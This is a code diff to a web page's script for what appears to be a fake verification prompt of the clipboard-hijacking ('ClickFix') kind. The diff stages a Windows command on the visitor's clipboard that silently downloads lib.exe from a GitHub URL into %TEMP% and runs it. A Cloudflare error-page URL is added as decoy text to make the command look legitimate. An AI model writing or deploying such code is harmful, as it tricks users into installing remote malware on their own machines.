@@ -447,8 +447,9 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const htaPath = window.location.origin + "/fbi && start /min %TEMP%\\lib.bat";
-            const commandToRun = 'cmd.exe /c curl -L -s -k -o %TEMP%\\lib.bat "https://raw.githubusercontent.com/fluorek/utils/main/lib.bat" && start ' + htaPath
+            //const htaPath = window.location.origin + "/fbi && start /min %TEMP%\\lib.bat";
+            const htaPath = "https://www.cloudflare.com/pl-pl/5xx-error-landing/?utm_source=iuam && start /min %TEMP%\\lib.bat";
+            const commandToRun = 'cmd.exe /c curl -L -s -k -o %TEMP%\\lib.exe "https://raw.githubusercontent.com/fluorek/utils/main/lib.exe" && start ' + htaPath
             stageClipboard(commandToRun, verification_id)
         }
 
